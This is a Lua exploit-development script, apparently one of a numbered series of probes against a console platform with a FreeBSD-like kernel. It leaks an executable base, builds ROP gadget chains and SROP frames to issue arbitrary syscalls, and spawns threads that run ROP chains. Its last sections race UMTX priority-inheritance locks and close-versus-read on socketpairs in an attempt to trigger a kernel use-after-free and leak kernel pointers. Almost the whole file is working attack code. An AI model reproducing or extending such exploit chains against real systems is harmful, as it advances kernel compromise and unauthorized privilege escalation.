-- CRASH_CLASS: MODERATE
-- PROBE 142p: Socketpair I/O between main and child threads + kernel race
--
-- 142o confirmed: socketpair(135) works (fd=24,25), pop_rdx;ret at +0x420E6D,
-- full 6-arg ROP from child threads, all write gadgets.
-- Now: test bidirectional I/O via socketpair between main thread and child,
-- then test close/read race for kernel UAF.

print("=== PROBE 142p: SOCKET+THREAD I/O ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function hex(v)
    if type(v) == "table" and v.h then
        return string.format("0x%08X%08X", v.h, v.l)
    end
    return string.format("0x%X", tonumber(v) or 0)
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function wq(addr, val) memory.write_qword(addr, val) end
local function wd(addr, val) memory.write_dword(addr, val) end

local sc20 = make_syscall(20)
local sc_gc = make_syscall(421)
local sc_sr = make_syscall(417)
local sc_mmap = make_syscall(477)
local sc_thr_create = make_syscall(430)
local sc_nanosleep = make_syscall(240)

local pid = to_num(sc20())
print("pid=" .. pid)

local _, gpu = pcall(function()
    return sc_mmap(uint64(0), uint64(0x400000), uint64(3),
        uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
end)
print("gpu=" .. hex(gpu))

local function ua(v)
    if type(v) == "table" and v.h then
        return uint64(string.format("0x%X%08X", v.h, v.l))
    end
    return uint64(string.format("0x%X", to_num(v)))
end

-- SROP + eboot gadgets
local MC = 0x40
local srop_ctx = memory.alloc(0x500)
pcall(function() return sc_gc(uint64(srop_ctx)) end)
local base_rip = memory.read_qword(srop_ctx + MC + 0xA0)
local rh, rl = get_hi_lo(base_rip)
local sc_addr = uint64(string.format("0x%X%08X", rh, rl - 2))
print("sc_addr=" .. hex(sc_addr))

local function srop(num, a1, a2, a3, a4, a5, a6)
    pcall(function() return sc_gc(uint64(srop_ctx)) end)
    wq(srop_ctx + MC + 0xA0, sc_addr)
    wq(srop_ctx + MC + 0x38, uint64(num))
    if a1 then wq(srop_ctx + MC + 0x08, a1) end
    if a2 then wq(srop_ctx + MC + 0x10, a2) end
    if a3 then wq(srop_ctx + MC + 0x18, a3) end
    if a4 then wq(srop_ctx + MC + 0x50, a4) end
    if a5 then wq(srop_ctx + MC + 0x28, a5) end
    if a6 then wq(srop_ctx + MC + 0x30, a6) end
    local ok, rv = pcall(function() return sc_sr(uint64(srop_ctx)) end)
    return rv
end

local info = memory.alloc(0x200)
wd(info, 0x160)
pcall(function() make_syscall(593)(uint64(0), uint64(info)) end)
local elo = safe_rd(info + 0x108) or 0
local ehi = safe_rd(info + 0x10C) or 0
local eboot = uint64(string.format("0x%X%08X", ehi, elo))
print("eboot=" .. hex(eboot))

local g_ret      = uint64(string.format("0x%X%08X", ehi, elo + 0x42))
local g_pop_rax  = uint64(string.format("0x%X%08X", ehi, elo + 0x992))
local g_pop_rdi  = uint64(string.format("0x%X%08X", ehi, elo + 0xC9DFE))
local g_pop_rsi  = uint64(string.format("0x%X%08X", ehi, elo + 0xD77D))
local g_pop_rdx  = uint64(string.format("0x%X%08X", ehi, elo + 0x420E6D))
local g_pop_rcx  = uint64(string.format("0x%X%08X", ehi, elo + 0xE64))
local g_wr_qword = uint64(string.format("0x%X%08X", ehi, elo + 0xD0B60))

--------------------------------------------------------------------
-- [A] Create socketpair + test main-thread I/O
--------------------------------------------------------------------
print("")
print("--- [A] Socketpair + main I/O ---")

local sp_fds = gpu + 0x100
wd(sp_fds, 0xDEAD)
wd(sp_fds + 4, 0xDEAD)

local rv_sp = srop(135, uint64(1), uint64(1), uint64(0), ua(sp_fds))
local fd_a = safe_rd(sp_fds)
local fd_b = safe_rd(sp_fds + 4)
print("[A] socketpair ret=" .. hex(rv_sp) .. " fd_a=" .. (fd_a or "nil") .. " fd_b=" .. (fd_b or "nil"))

if not fd_a or fd_a == 0xDEAD then
    print("[A] SOCKETPAIR FAILED")
    print("=== DONE ===")
    return
end

-- Write "MAGIC" on fd_a from main thread
local wbuf = gpu + 0x200
wd(wbuf, 0x47414D41)     -- "AMAG" (little-endian "MAGI")
wd(wbuf + 4, 0x00000043) -- "C\0"

local rv_w = srop(4, uint64(fd_a), ua(wbuf), uint64(5))
print("[A] write(fd_a, 5) ret=" .. hex(rv_w))

-- Read on fd_b from main thread
local rbuf = gpu + 0x300
wd(rbuf, 0)
wd(rbuf + 4, 0)

local rv_r = srop(3, uint64(fd_b), ua(rbuf), uint64(5))
print("[A] read(fd_b, 5) ret=" .. hex(rv_r))

local r0 = safe_rd(rbuf)
print("[A] read_data=0x" .. string.format("%08X", r0 or 0))
if r0 == 0x47414D41 then
    print("[A] *** SOCKETPAIR I/O WORKS! ***")
end

--------------------------------------------------------------------
-- [B] Child thread writes to socketpair, main thread reads
-- Thread ROP: write(fd_b, marker_buf, 8)  then nanosleep(30s)
--------------------------------------------------------------------
print("")
print("--- [B] Thread→socket I/O ---")

-- Create another socketpair for this test
local sp2_fds = gpu + 0x110
wd(sp2_fds, 0xDEAD)
wd(sp2_fds + 4, 0xDEAD)
srop(135, uint64(1), uint64(1), uint64(0), ua(sp2_fds))
local fd2_a = safe_rd(sp2_fds)
local fd2_b = safe_rd(sp2_fds + 4)
print("[B] socketpair2: fd_a=" .. (fd2_a or "nil") .. " fd_b=" .. (fd2_b or "nil"))

if not fd2_a or fd2_a == 0xDEAD then
    print("[B] SOCKETPAIR2 FAILED")
else
    -- Marker data the child thread will write
    local marker = gpu + 0x1000
    wq(marker, uint64("0xCAFEBABE12345678"))

    -- Timespec for keep-alive
    local tspec = gpu + 0x1100
    wq(tspec, uint64(30))
    wq(tspec + 8, uint64(0))

    -- Short sleep for settle
    local tspec_short = gpu + 0x1200
    wq(tspec_short, uint64(0))
    wq(tspec_short + 8, uint64(100000000))  -- 100ms

    -- ROP chain: nanosleep(100ms) → write(fd2_b, marker, 8) → nanosleep(30s)
    local rop_b = gpu + 0x10000
    local i = 0

    -- 1. Short nanosleep settle
    wq(rop_b + i, g_pop_rdi); i=i+8
    wq(rop_b + i, ua(tspec_short)); i=i+8
    wq(rop_b + i, g_pop_rsi); i=i+8
    wq(rop_b + i, uint64(0)); i=i+8
    wq(rop_b + i, g_pop_rax); i=i+8
    wq(rop_b + i, uint64(240)); i=i+8
    wq(rop_b + i, sc_addr); i=i+8

    -- 2. write(fd2_b, marker, 8)
    wq(rop_b + i, g_pop_rdi); i=i+8
    wq(rop_b + i, uint64(fd2_b)); i=i+8
    wq(rop_b + i, g_pop_rsi); i=i+8
    wq(rop_b + i, ua(marker)); i=i+8
    wq(rop_b + i, g_pop_rdx); i=i+8
    wq(rop_b + i, uint64(8)); i=i+8
    wq(rop_b + i, g_pop_rax); i=i+8
    wq(rop_b + i, uint64(4)); i=i+8   -- write = 4
    wq(rop_b + i, sc_addr); i=i+8

    -- 3. Long nanosleep keep-alive
    wq(rop_b + i, g_pop_rdi); i=i+8
    wq(rop_b + i, ua(tspec)); i=i+8
    wq(rop_b + i, g_pop_rsi); i=i+8
    wq(rop_b + i, uint64(0)); i=i+8
    wq(rop_b + i, g_pop_rax); i=i+8
    wq(rop_b + i, uint64(240)); i=i+8
    wq(rop_b + i, sc_addr); i=i+8

    -- Create thread
    local ctx_b = gpu + 0x20000
    for off = 0, 0x4FF, 4 do wd(ctx_b + off, 0) end
    pcall(function() return sc_gc(uint64(ctx_b)) end)
    wq(ctx_b + 0xE0, g_ret)
    wq(ctx_b + 0xF8, ua(rop_b))

    local tid_b = gpu + 0x30000
    wq(tid_b, uint64(0xDEADDEAD))

    print("[B] Creating writer thread...")
    local ok_b, rv_b = pcall(function()
        return sc_thr_create(uint64(ctx_b), uint64(tid_b), uint64(0))
    end)
    local ntid_b = safe_rq(tid_b)
    local nbh, nbl = get_hi_lo(ntid_b)
    print("[B] ok=" .. tostring(ok_b) .. " rv=" .. tostring(rv_b) .. " tid=" .. nbl)

    -- Wait 500ms for thread to write
    local ts_wait = memory.alloc(16)
    wq(ts_wait, uint64(0))
    wq(ts_wait + 8, uint64(500000000))
    pcall(function() sc_nanosleep(uint64(ts_wait), uint64(0)) end)

    -- Read from fd2_a (main thread reads what child wrote)
    local rbuf_b = gpu + 0x2000
    wq(rbuf_b, uint64(0))

    local rv_rb = srop(3, uint64(fd2_a), ua(rbuf_b), uint64(8))
    local rbvh, rbvl = get_hi_lo(rv_rb)
    print("[B] read(fd2_a, 8) ret=" .. hex(rv_rb))

    local read_val = safe_rq(rbuf_b)
    print("[B] read_data=" .. hex(read_val))
    if read_val then
        local rdh, rdl = get_hi_lo(read_val)
        if rdh == 0xCAFEBABE and rdl == 0x12345678 then
            print("[B] *** THREAD→SOCKET→MAIN I/O CONFIRMED! ***")
        end
    end
end

--------------------------------------------------------------------
-- [C] UMTX PI futex race: two threads lock/unlock same futex
-- Thread1: LOCK_PI in loop, Thread2: UNLOCK_PI in loop
-- Goal: trigger kernel UAF in PI chain manipulation
--------------------------------------------------------------------
print("")
print("--- [C] UMTX PI race ---")

-- Create 2 socketpairs for coordination
local sp3_fds = gpu + 0x120
wd(sp3_fds, 0xDEAD); wd(sp3_fds + 4, 0xDEAD)
srop(135, uint64(1), uint64(1), uint64(0), ua(sp3_fds))
local fd3_a = safe_rd(sp3_fds)
local fd3_b = safe_rd(sp3_fds + 4)
print("[C] coordination socketpair: " .. (fd3_a or "nil") .. ", " .. (fd3_b or "nil"))

-- Race futex
local race_futex = gpu + 0x3000
wq(race_futex, uint64(0))

-- Timespec
local tspec_tiny = gpu + 0x3100
wq(tspec_tiny, uint64(0))
wq(tspec_tiny + 8, uint64(10000000))  -- 10ms

local tspec_long = gpu + 0x3200
wq(tspec_long, uint64(30))
wq(tspec_long + 8, uint64(0))

-- Thread 1: LOCK_PI loop (10 iterations with tiny sleeps)
local rop_c1 = gpu + 0x40000
local i = 0

for iter = 1, 10 do
    -- nanosleep 10ms
    wq(rop_c1 + i, g_pop_rdi); i=i+8
    wq(rop_c1 + i, ua(tspec_tiny)); i=i+8
    wq(rop_c1 + i, g_pop_rsi); i=i+8
    wq(rop_c1 + i, uint64(0)); i=i+8
    wq(rop_c1 + i, g_pop_rax); i=i+8
    wq(rop_c1 + i, uint64(240)); i=i+8
    wq(rop_c1 + i, sc_addr); i=i+8

    -- LOCK_PI (op=12)
    wq(rop_c1 + i, g_pop_rdi); i=i+8
    wq(rop_c1 + i, ua(race_futex)); i=i+8
    wq(rop_c1 + i, g_pop_rsi); i=i+8
    wq(rop_c1 + i, uint64(12)); i=i+8
    wq(rop_c1 + i, g_pop_rdx); i=i+8
    wq(rop_c1 + i, uint64(0)); i=i+8
    wq(rop_c1 + i, g_pop_rax); i=i+8
    wq(rop_c1 + i, uint64(454)); i=i+8
    wq(rop_c1 + i, sc_addr); i=i+8

    -- UNLOCK_PI (op=13) — immediately unlock
    wq(rop_c1 + i, g_pop_rdi); i=i+8
    wq(rop_c1 + i, ua(race_futex)); i=i+8
    wq(rop_c1 + i, g_pop_rsi); i=i+8
    wq(rop_c1 + i, uint64(13)); i=i+8
    wq(rop_c1 + i, g_pop_rdx); i=i+8
    wq(rop_c1 + i, uint64(0)); i=i+8
    wq(rop_c1 + i, g_pop_rax); i=i+8
    wq(rop_c1 + i, uint64(454)); i=i+8
    wq(rop_c1 + i, sc_addr); i=i+8
end

-- Keep-alive
wq(rop_c1 + i, g_pop_rdi); i=i+8
wq(rop_c1 + i, ua(tspec_long)); i=i+8
wq(rop_c1 + i, g_pop_rsi); i=i+8
wq(rop_c1 + i, uint64(0)); i=i+8
wq(rop_c1 + i, g_pop_rax); i=i+8
wq(rop_c1 + i, uint64(240)); i=i+8
wq(rop_c1 + i, sc_addr); i=i+8

-- Thread 2: same pattern but slightly offset timing
local rop_c2 = gpu + 0x50000
i = 0

-- Initial tiny sleep (5ms offset)
local tspec_tiny2 = gpu + 0x3300
wq(tspec_tiny2, uint64(0))
wq(tspec_tiny2 + 8, uint64(5000000))  -- 5ms

wq(rop_c2 + i, g_pop_rdi); i=i+8
wq(rop_c2 + i, ua(tspec_tiny2)); i=i+8
wq(rop_c2 + i, g_pop_rsi); i=i+8
wq(rop_c2 + i, uint64(0)); i=i+8
wq(rop_c2 + i, g_pop_rax); i=i+8
wq(rop_c2 + i, uint64(240)); i=i+8
wq(rop_c2 + i, sc_addr); i=i+8

for iter = 1, 10 do
    -- LOCK_PI
    wq(rop_c2 + i, g_pop_rdi); i=i+8
    wq(rop_c2 + i, ua(race_futex)); i=i+8
    wq(rop_c2 + i, g_pop_rsi); i=i+8
    wq(rop_c2 + i, uint64(12)); i=i+8
    wq(rop_c2 + i, g_pop_rdx); i=i+8
    wq(rop_c2 + i, uint64(0)); i=i+8
    wq(rop_c2 + i, g_pop_rax); i=i+8
    wq(rop_c2 + i, uint64(454)); i=i+8
    wq(rop_c2 + i, sc_addr); i=i+8

    -- UNLOCK_PI
    wq(rop_c2 + i, g_pop_rdi); i=i+8
    wq(rop_c2 + i, ua(race_futex)); i=i+8
    wq(rop_c2 + i, g_pop_rsi); i=i+8
    wq(rop_c2 + i, uint64(13)); i=i+8
    wq(rop_c2 + i, g_pop_rdx); i=i+8
    wq(rop_c2 + i, uint64(0)); i=i+8
    wq(rop_c2 + i, g_pop_rax); i=i+8
    wq(rop_c2 + i, uint64(454)); i=i+8
    wq(rop_c2 + i, sc_addr); i=i+8

    -- Tiny sleep between iterations
    wq(rop_c2 + i, g_pop_rdi); i=i+8
    wq(rop_c2 + i, ua(tspec_tiny)); i=i+8
    wq(rop_c2 + i, g_pop_rsi); i=i+8
    wq(rop_c2 + i, uint64(0)); i=i+8
    wq(rop_c2 + i, g_pop_rax); i=i+8
    wq(rop_c2 + i, uint64(240)); i=i+8
    wq(rop_c2 + i, sc_addr); i=i+8
end

-- Keep-alive
wq(rop_c2 + i, g_pop_rdi); i=i+8
wq(rop_c2 + i, ua(tspec_long)); i=i+8
wq(rop_c2 + i, g_pop_rsi); i=i+8
wq(rop_c2 + i, uint64(0)); i=i+8
wq(rop_c2 + i, g_pop_rax); i=i+8
wq(rop_c2 + i, uint64(240)); i=i+8
wq(rop_c2 + i, sc_addr); i=i+8

-- Create both threads
local ctx_c1 = gpu + 0x60000
for off = 0, 0x4FF, 4 do wd(ctx_c1 + off, 0) end
pcall(function() return sc_gc(uint64(ctx_c1)) end)
wq(ctx_c1 + 0xE0, g_ret)
wq(ctx_c1 + 0xF8, ua(rop_c1))

local ctx_c2 = gpu + 0x70000
for off = 0, 0x4FF, 4 do wd(ctx_c2 + off, 0) end
pcall(function() return sc_gc(uint64(ctx_c2)) end)
wq(ctx_c2 + 0xE0, g_ret)
wq(ctx_c2 + 0xF8, ua(rop_c2))

local tid_c1 = gpu + 0x80000
local tid_c2 = gpu + 0x80010
wq(tid_c1, uint64(0xDEADDEAD))
wq(tid_c2, uint64(0xDEADDEAD))

print("[C] Creating race threads...")
local ok1, rv1 = pcall(function()
    return sc_thr_create(uint64(ctx_c1), uint64(tid_c1), uint64(0))
end)
local ok2, rv2 = pcall(function()
    return sc_thr_create(uint64(ctx_c2), uint64(tid_c2), uint64(0))
end)

local t1 = safe_rq(tid_c1)
local t2 = safe_rq(tid_c2)
local t1h, t1l = get_hi_lo(t1)
local t2h, t2l = get_hi_lo(t2)
print("[C] thread1: rv=" .. tostring(rv1) .. " tid=" .. t1l)
print("[C] thread2: rv=" .. tostring(rv2) .. " tid=" .. t2l)

-- Wait 2s for race to complete
local ts_race = memory.alloc(16)
wq(ts_race, uint64(2))
wq(ts_race + 8, uint64(0))
pcall(function() sc_nanosleep(uint64(ts_race), uint64(0)) end)

-- Check if process survived
local alive_pid = to_num(sc20())
print("[C] alive? pid=" .. alive_pid)

-- Check threads alive
if t1l ~= 0xDEADDEAD then
    local rv_k1 = srop(433, uint64(t1l), uint64(0))
    print("[C] thread1 thr_kill=" .. hex(rv_k1))
end
if t2l ~= 0xDEADDEAD then
    local rv_k2 = srop(433, uint64(t2l), uint64(0))
    print("[C] thread2 thr_kill=" .. hex(rv_k2))
end

-- Check futex state
local fval = safe_rd(race_futex)
print("[C] futex=" .. (fval or "nil"))

--------------------------------------------------------------------
-- [D] Socketpair close/read race
-- Thread 1: blocks on read(fd_a)
-- Main thread: close(fd_a) while thread is reading
--------------------------------------------------------------------
print("")
print("--- [D] Close/read race ---")

-- New socketpair for this test
local sp4_fds = gpu + 0x130
wd(sp4_fds, 0xDEAD); wd(sp4_fds + 4, 0xDEAD)
srop(135, uint64(1), uint64(1), uint64(0), ua(sp4_fds))
local fd4_a = safe_rd(sp4_fds)
local fd4_b = safe_rd(sp4_fds + 4)
print("[D] race socketpair: " .. (fd4_a or "nil") .. ", " .. (fd4_b or "nil"))

if fd4_a and fd4_a ~= 0xDEAD then
    -- Thread will read(fd4_a, buf, 0x100) — blocks until data or fd closed
    local read_buf = gpu + 0x90000
    wq(read_buf, uint64(0))

    local rop_d = gpu + 0xA0000
    i = 0

    -- Short settle
    wq(rop_d + i, g_pop_rdi); i=i+8
    wq(rop_d + i, ua(tspec_tiny)); i=i+8
    wq(rop_d + i, g_pop_rsi); i=i+8
    wq(rop_d + i, uint64(0)); i=i+8
    wq(rop_d + i, g_pop_rax); i=i+8
    wq(rop_d + i, uint64(240)); i=i+8
    wq(rop_d + i, sc_addr); i=i+8

    -- read(fd4_a, read_buf, 0x100) — will block
    wq(rop_d + i, g_pop_rdi); i=i+8
    wq(rop_d + i, uint64(fd4_a)); i=i+8
    wq(rop_d + i, g_pop_rsi); i=i+8
    wq(rop_d + i, ua(read_buf)); i=i+8
    wq(rop_d + i, g_pop_rdx); i=i+8
    wq(rop_d + i, uint64(0x100)); i=i+8
    wq(rop_d + i, g_pop_rax); i=i+8
    wq(rop_d + i, uint64(3)); i=i+8   -- read = 3
    wq(rop_d + i, sc_addr); i=i+8

    -- After read returns: write result to marker
    local result_marker = gpu + 0x90100
    wq(result_marker, uint64("0xAAAAAAAABBBBBBBB"))

    -- Store RAX (read result) to result_marker using mov[rdi],rax gadget
    wq(rop_d + i, g_pop_rdi); i=i+8
    wq(rop_d + i, ua(result_marker)); i=i+8
    wq(rop_d + i, g_wr_qword); i=i+8  -- mov [rdi], rax; ret → stores read result

    -- Keep-alive
    wq(rop_d + i, g_pop_rdi); i=i+8
    wq(rop_d + i, ua(tspec_long)); i=i+8
    wq(rop_d + i, g_pop_rsi); i=i+8
    wq(rop_d + i, uint64(0)); i=i+8
    wq(rop_d + i, g_pop_rax); i=i+8
    wq(rop_d + i, uint64(240)); i=i+8
    wq(rop_d + i, sc_addr); i=i+8

    -- Create reader thread
    local ctx_d = gpu + 0xB0000
    for off = 0, 0x4FF, 4 do wd(ctx_d + off, 0) end
    pcall(function() return sc_gc(uint64(ctx_d)) end)
    wq(ctx_d + 0xE0, g_ret)
    wq(ctx_d + 0xF8, ua(rop_d))

    local tid_d = gpu + 0xC0000
    wq(tid_d, uint64(0xDEADDEAD))

    print("[D] Creating reader thread...")
    local ok_d, rv_d = pcall(function()
        return sc_thr_create(uint64(ctx_d), uint64(tid_d), uint64(0))
    end)
    local ntid_d = safe_rq(tid_d)
    local ndh, ndl = get_hi_lo(ntid_d)
    print("[D] reader tid=" .. ndl)

    -- Wait 50ms for thread to enter read
    local ts_50 = memory.alloc(16)
    wq(ts_50, uint64(0))
    wq(ts_50 + 8, uint64(50000000))
    pcall(function() sc_nanosleep(uint64(ts_50), uint64(0)) end)

    -- Close fd4_a from main thread while child is reading it
    print("[D] Closing fd4_a=" .. fd4_a .. " while child reads...")
    local rv_close = srop(6, uint64(fd4_a))  -- close = 6
    print("[D] close ret=" .. hex(rv_close))

    -- Wait 200ms for the read to error out
    local ts_200 = memory.alloc(16)
    wq(ts_200, uint64(0))
    wq(ts_200 + 8, uint64(200000000))
    pcall(function() sc_nanosleep(uint64(ts_200), uint64(0)) end)

    -- Check if process survived
    alive_pid = to_num(sc20())
    print("[D] alive? pid=" .. alive_pid)

    -- Check result marker
    local rm_val = safe_rq(result_marker)
    print("[D] result_marker=" .. hex(rm_val))
    if rm_val then
        local rmh, rml = get_hi_lo(rm_val)
        if rmh ~= 0xAAAAAAAA then
            print("[D] *** READ RETURNED: " .. hex(rm_val) .. " ***")
            if rmh >= 0xFFFF8000 then
                print("[D] *** KERNEL POINTER IN READ RESULT?! ***")
            end
        end
    end

    -- Check thread status
    if ndl ~= 0xDEADDEAD then
        local rv_kd = srop(433, uint64(ndl), uint64(0))
        print("[D] reader thr_kill=" .. hex(rv_kd))
    end

    -- Check read buffer for any kernel data
    print("[D] read_buf dump:")
    for off = 0, 0x3C, 4 do
        local v = safe_rd(read_buf + off)
        if v and v ~= 0 then
            print("[D]  +" .. string.format("%02X", off) .. " = 0x" .. string.format("%08X", v))
        end
    end
end

print("")
print("=== DONE ===")
